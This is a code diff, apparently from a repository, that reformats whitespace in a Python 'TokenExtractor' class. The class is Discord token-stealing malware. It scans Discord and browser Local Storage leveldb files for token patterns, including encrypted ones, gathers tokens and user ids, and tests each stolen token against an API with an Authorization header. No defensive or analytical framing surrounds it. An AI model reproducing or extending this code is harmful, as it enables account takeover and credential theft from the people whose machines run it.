@@ -12,10 +12,8 @@ class TokenExtractor:
         self.roaming = os.getenv("appdata")
         self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
-
         self.tokens, self.uids = [], []
-        self.extract()
-
+        self.extract() 
     def extract(self) -> None:
         paths = {
             'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
@@ -36,7 +34,6 @@ class TokenExtractor:
             'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
             'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
         }
-
         for name, path in paths.items():
             if not os.path.exists(path):
                 continue
@@ -56,7 +53,6 @@ class TokenExtractor:
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
-
             else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
@@ -68,7 +64,6 @@ class TokenExtractor:
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
-
     def validate_token(self, token: str) -> bool:
         r = requests.get(self.base_url, headers={'Authorization': token})
         return r.status_code == 200
